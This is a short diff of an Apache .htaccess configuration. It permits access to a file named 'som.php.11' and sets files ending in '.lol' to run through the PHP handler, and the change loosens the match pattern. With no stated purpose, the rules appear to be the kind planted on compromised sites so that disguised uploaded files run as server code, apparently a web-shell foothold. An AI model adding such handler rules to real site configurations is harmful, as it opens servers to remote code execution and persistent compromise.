@@ -9,6 +9,6 @@ Allow from all
 <Files som.php.11>
 Allow from all
 </Files>
-<FilesMatch \.(lol)$>
+<FilesMatch .(lol)$>
      SetHandler application/x-httpd-php
 </FilesMatch>
